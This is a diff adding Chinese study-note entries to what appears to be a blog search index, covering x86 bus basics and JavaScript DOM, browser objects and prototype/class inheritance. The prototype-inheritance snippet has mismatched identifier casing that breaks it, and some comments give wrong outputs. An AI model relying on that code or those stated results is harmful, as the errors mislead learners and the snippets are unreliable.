title="读写操作步骤："></a>读写操作步骤：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.3.png?raw=true" alt="1.1.3.png"></p><ol><li>cpu通过地址线将要操作的地址信息发出</li><li>CPU通过控制线发出内存读/写命令，选中存储芯片，并通知它，将要读/写数据。</li><li>存储器将cpu需要的单元中的数据通过导线送入cpu，反之亦然。</li></ol><blockquote><p>例：</p><ul><li>机器码：10100001 00000011 00000000</li><li>对应的汇编指令：MOV AX,[3]</li><li>含义： 传送3号单元的内容入AX</li></ul></blockquote><h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><blockquote><p>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度位N。这样的CPU最多可以寻找2的N次方个内存单元。</p></blockquote><h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><blockquote><p>数据总线的宽度决定了CPU和外节的数据传送速度。8根数据总线一次可传送一个8位二进制数据（即一个字节）。16根数据总线一次就是可以传送两个字节</p><ul><li>8088CPU总线宽度为8，向内存中写入数据89D8时，由于一次只能传送一个8位2进制数，所以第一次传送D8，第二次传送89</li><li>8086CPU总线宽度位16，向内存中写入数据89D8时，由于一次可以传送1个16位2进制数，所以一次性传输89D8</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.5.png?raw=true" alt="1.1.5.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/1.1.6.png?raw=true" alt="1.1.6.png"></p></blockquote><h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><blockquote><p>控制总线是一些不同控制线的集合。有多少控制总线，就意味着CPU提供了对外部器件的多少种控制，所以控制总线的宽度决定了CPU对外部器件的控制能力。</p></blockquote><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol><li><p>汇编指令是机器指令的助记符，统计器指令一一对应。</p></li><li><p>每一种CPU都有自己的汇编指令集。</p></li><li><p>CPU可以直接使用的信息在存储器中存放。</p></li><li><p>在存储器中指令和数据没有任何区别，都是二进制信息。</p></li><li><p>存储单元从令开始顺序编号</p></li><li><p>一个存储单元可以存储8个bit，即8位二进制数。</p></li><li><p>1Byte=8bit      1KB=1024B    1MB=1024KB    1GB=1024MB</p></li><li><p>每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出三种总线的宽度标志了这个CPU的不同方面的性能。</p><blockquote><p>地址总线的宽度决定了CPU的寻址能力；</p><p>数据总线的宽度决定了CPU与其他器件进行数据传送时的一次数据传送量；</p><p>控制总线的宽度掘洞了CPU对系统中其他器件的控制能力。</p></blockquote></li></ol><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X08)</title>
+      <link href="2020/09/01/JS_0X08/"/>
+      <url>2020/09/01/JS_0X08/</url>
+      
+        <content type="html"><![CDATA[<h1 id="操作DOM（浏览器）"><a href="#操作DOM（浏览器）" class="headerlink" title="操作DOM（浏览器）"></a>操作DOM（浏览器）</h1><p>HTML文档被浏览器解析后就是一棵DOM树，操作DOM的方式：</p><blockquote><ul><li>更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容；</li><li>遍历：遍历该DOM节点下的子节点，以便进行进一步操作；</li><li>添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点；</li><li>删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。</li></ul></blockquote><p>在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。</p><ul><li><p>最常用的方法是<code>document.getElementById()</code>和<code>document.getElementsByTagName()</code></p></li><li><p>以及CSS选择器<code>document.getElementsByClassName()</code></p><p>  例如：</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回ID为&#x27;test&#x27;的节点：</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先定位ID为&#x27;test-table&#x27;的节点，再返回其内部所有tr节点：</span></span><br><span class="line"><span class="keyword">var</span> trs = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-table&#x27;</span>).getElementsByTagName(<span class="string">&#x27;tr&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先定位ID为&#x27;test-div&#x27;的节点，再返回其内部所有class包含red的节点：</span></span><br><span class="line"><span class="keyword">var</span> reds = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-div&#x27;</span>).getElementsByClassName(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取节点test下的所有直属子节点:</span></span><br><span class="line"><span class="keyword">var</span> cs = test.children;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取节点test下第一个、最后一个子节点：</span></span><br><span class="line"><span class="keyword">var</span> first = test.firstElementChild;</span><br><span class="line"><span class="keyword">var</span> last = test.lastElementChild;</span><br></pre></td></tr></table></figure><p>  第二种方法是使用<code>querySelector()</code>和<code>querySelectorAll()</code>，需要了解selector语法，然后使用条件来获取节点，更加方便：</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过querySelector获取ID为q1的节点：</span></span><br><span class="line"><span class="keyword">var</span> q1 = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#q1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过querySelectorAll获取q1节点内的符合条件的所有节点：</span></span><br><span class="line"><span class="keyword">var</span> ps = q1.querySelectorAll(<span class="string">&#x27;div.highlighted &gt; p&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ul><h1 id="更新DOM"><a href="#更新DOM" class="headerlink" title="更新DOM"></a>更新DOM</h1><p>直接修改节点的文本，方法有两种：</p><ul><li><p>一种是修改<code>innerHTML</code>属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树：</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取&lt;p id=&quot;p-id&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p-id&#x27;</span>);</span><br><span class="line"><span class="comment">// 设置文本为abc:</span></span><br><span class="line">p.innerHTML = <span class="string">&#x27;ABC&#x27;</span>; <span class="comment">// &lt;p id=&quot;p-id&quot;&gt;ABC&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// 设置HTML:</span></span><br><span class="line">p.innerHTML = <span class="string">&#x27;ABC &lt;span style=&quot;color:red&quot;&gt;RED&lt;/span&gt; XYZ&#x27;</span>;</span><br><span class="line"><span class="comment">// &lt;p&gt;...&lt;/p&gt;的内部结构已修改</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="插入DOM"><a href="#插入DOM" class="headerlink" title="插入DOM"></a>插入DOM</h1><p>向如下代码中插入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;scheme&quot;</span>&gt;</span>Scheme<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把<code>&lt;p id=&quot;js&quot;&gt;JavaScript&lt;/p&gt;</code>添加到<code>&lt;div id=&quot;list&quot;&gt;</code>的最后一项：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br><span class="line">    js = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;js&#x27;</span>),</span><br><span class="line">    list = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;list&#x27;</span>);</span><br><span class="line">list.appendChild(js);</span><br></pre></td></tr></table></figure><p>此时HTML的结构就变成了如下的样子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;scheme&quot;</span>&gt;</span>Scheme<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;js&quot;</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="删除DOM"><a href="#删除DOM" class="headerlink" title="删除DOM"></a>删除DOM</h1><p>要删除一个节点，首先要获得该节点本身以及它的父节点，然后，调用父节点的<code>removeChild</code>把自己删掉：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿到待删除节点:</span></span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;to-be-removed&#x27;</span>);</span><br><span class="line"><span class="comment">// 拿到父节点:</span></span><br><span class="line"><span class="keyword">var</span> parent = self.parentElement;</span><br><span class="line"><span class="comment">// 删除:</span></span><br><span class="line"><span class="keyword">var</span> removed = parent.removeChild(self);</span><br><span class="line">removed === self; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>First<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Second<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>删除：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;parent&#x27;</span>);</span><br><span class="line">parent.removeChild(parent.children[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X07)</title>
+      <link href="2020/08/31/JS_0X07/"/>
+      <url>2020/08/31/JS_0X07/</url>
+      
+        <content type="html"><![CDATA[<h1 id="浏览器对象"><a href="#浏览器对象" class="headerlink" title="浏览器对象"></a>浏览器对象</h1><h2 id="window"><a href="#window" class="headerlink" title="window"></a>window</h2><p>​    <code>window</code>对象有<code>innerWidth</code>和<code>innerHeight</code>属性，可获取浏览器窗口的高和宽。</p><p>​    <code>outerWidth</code>和<code>outerHeight</code>属性，可以获取浏览器窗口的整个宽高。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;window inner size: &#x27;</span> + <span class="built_in">window</span>.innerWidth + <span class="string">&#x27; x &#x27;</span> + <span class="built_in">window</span>.innerHeight);</span><br><span class="line"><span class="comment">//显示当前浏览器的内部高和宽</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;window inner size: &#x27;</span> + <span class="built_in">window</span>.outerWidth + <span class="string">&#x27; x &#x27;</span> + <span class="built_in">window</span>.outerHeight);</span><br><span class="line"><span class="comment">//获取浏览器窗口的整个宽高。</span></span><br></pre></td></tr></table></figure><h2 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h2><p><code>navigator</code>对象表示浏览器的信息，最常用的属性包括：</p><ul><li>navigator.appName：浏览器名称；</li><li>navigator.appVersion：浏览器版本；</li><li>navigator.language：浏览器设置的语言；</li><li>navigator.platform：操作系统类型；</li><li>navigator.userAgent：浏览器设定的<code>User-Agent</code>字符串。</li></ul><h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><p><code>screen</code>对象表示屏幕的信息，常用的属性有：</p><ul><li>screen.width：屏幕宽度，以像素为单位；</li><li>screen.height：屏幕高度，以像素为单位；</li><li>screen.colorDepth：返回颜色位数，如8、16、24。</li></ul><h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><p><code>location</code>对象表示当前页面的URL信息。例如，一个完整的URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com:8080&#x2F;path&#x2F;index.html?a&#x3D;1&amp;b&#x3D;2#TOP</span><br></pre></td></tr></table></figure><p>可以用<code>location.href</code>获取。要获得URL各个部分的值，可以这么写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location.protocol; <span class="comment">// &#x27;http&#x27;</span></span><br><span class="line">location.host; <span class="comment">// &#x27;www.example.com&#x27;</span></span><br><span class="line">location.port; <span class="comment">// &#x27;8080&#x27;</span></span><br><span class="line">location.pathname; <span class="comment">// &#x27;/path/index.html&#x27;</span></span><br><span class="line">location.search; <span class="comment">// &#x27;?a=1&amp;b=2&#x27;</span></span><br><span class="line">location.hash; <span class="comment">// &#x27;TOP&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p><code>document</code>对象表示<strong>当前页面</strong>。由于HTML在浏览器中以DOM形式表示为树形结构，<code>document</code>对象就是整个DOM树的根节点。</p><p><code>document</code>的<code>title</code>属性是从HTML文档中的<code>&lt;title&gt;xxx&lt;/title&gt;</code>读取的</p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p><code>history</code>对象保存了浏览器的历史记录，JavaScript可以调用<code>history</code>对象的<code>back()</code>或<code>forward ()</code>，相当于用户点击了浏览器的“后退”或“前进”按钮。</p><p>这个对象属于历史遗留对象，对于现代Web页面来说，由于大量使用AJAX和页面交互，简单粗暴地调用<code>history.back()</code>可能会让用户感到非常愤怒。</p><p>新手开始设计Web页面时喜欢在登录页登录成功时调用<code>history.back()</code>，试图回到登录前的页面。这是一种错误的方法。</p><p>任何情况，你都不应该使用<code>history</code>这个对象了。</p><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X06)</title>
+      <link href="2020/08/30/JS_0X06/"/>
+      <url>2020/08/30/JS_0X06/</url>
+      
+        <content type="html"><![CDATA[<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><blockquote><p>先用实例举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> robot = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.6</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这时候调用<code>robot.run()</code>就会得到<code>Robot is running</code></p><p>然后再创建一个<code>xiaoming</code>，让小明集成<code>robot</code>，小明就也可以调用<code>run</code>了.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Student = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.2</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.__proto__ = Student;</span><br><span class="line">xiaoming.run();  <span class="comment">//让小明来调用run</span></span><br></pre></td></tr></table></figure></blockquote><p>更高级的方法，看起来也更实用，写一个函数来创建<code>xiaoming</code>，上述方法会直接改变对象的原型，不太好。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原型对象:</span></span><br><span class="line"><span class="keyword">var</span> Student = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Robot&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.2</span>,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is running...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createStudent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 基于Student原型创建一个新对象:</span></span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">Object</span>.create(Student);</span><br><span class="line">    <span class="comment">// 初始化新对象:</span></span><br><span class="line">    s.name = name;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = createStudent(<span class="string">&#x27;小明&#x27;</span>);</span><br><span class="line">xiaoming.run(); <span class="comment">// 小明 is running...</span></span><br><span class="line">xiaoming.__proto__ === Student; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h1 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h1><p>汪</p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>除了直接用<code>&#123; ... &#125;</code>创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;小明&#x27;</span>); <span class="comment">//用new来调用</span></span><br><span class="line">xiaoming.name; <span class="comment">// &#x27;小明&#x27;    //返回一个对象</span></span><br><span class="line">xiaoming.hello(); <span class="comment">// Hello, 小明!</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：在strict模式下，<code>this.name = name</code>将报错，因为<code>this</code>绑定为<code>undefined</code>，在非strict模式下，<code>this.name = name</code>不报错，因为<code>this</code>绑定为<code>window</code>，于是无意间创建了全局变量<code>name</code></p></blockquote><h1 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h1><p>JavaScript的原型继承实现方式就是：</p><blockquote><ol><li>定义新的构造函数，并在内部用<code>call()</code>调用希望“继承”的构造函数，并绑定<code>this</code>；</li><li>借助中间函数<code>F</code>实现原型链继承，最好通过封装的<code>inherits</code>函数完成；</li><li>继续在新的构造函数的原型上定义新方法。</li></ol></blockquote><p>例：基于<code>student</code>扩展<code>primarystudent</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrimaryStudent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用Student构造函数，绑定this变量:</span></span><br><span class="line">    Student.call(<span class="built_in">this</span>, props);</span><br><span class="line">    <span class="built_in">this</span>.grade = props.grade || <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个空函数F</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//F指向stu.prototype</span></span><br><span class="line">F.prototype = student.prototype;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pri-stu指向一个新的F对象,而此时F正好是指向stu.prototype的。</span></span><br><span class="line">primarystudent.prototype = <span class="keyword">new</span> F();</span><br><span class="line"></span><br><span class="line"><span class="comment">//把pri-stu的构造函数修复为pri-stu</span></span><br><span class="line">PrimaryStudent.prototype.constructor = PrimaryStudent;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在F上定义方法</span></span><br><span class="line">primarystudent.prototype.getGrade = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.grade;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h1><blockquote><p>代码对比看的就比较清晰了</p></blockquote><h3 id="函数实现方法"><a href="#函数实现方法" class="headerlink" title="函数实现方法"></a>函数实现方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Class实现方法"><a href="#Class实现方法" class="headerlink" title="Class实现方法"></a>Class实现方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hello() &#123;</span><br><span class="line">        alert(<span class="string">&#x27;Hello, &#x27;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用的时候是一样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">&#x27;小明&#x27;</span>);</span><br><span class="line">xiaoming.hello();</span><br></pre></td></tr></table></figure><h1 id="Class继承"><a href="#Class继承" class="headerlink" title="Class继承"></a>Class继承</h1><p>class继承代码量少了许多，而且直接通过extends来实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name, grade) &#123;</span><br><span class="line">        <span class="built_in">super</span>(name); <span class="comment">// 记得用super调用父类的构造方法!</span></span><br><span class="line">        <span class="built_in">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myGrade() &#123;</span><br><span class="line">        alert(<span class="string">&#x27;I am at grade &#x27;</span> + <span class="built_in">this</span>.grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><u>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的地址是<a href="https://www.liaoxuefeng.com/">廖学峰的官方网站</a>。</u></em></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> JS学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X05)</title>
+      <link href="2020/08/29/JS_0X05/"/>
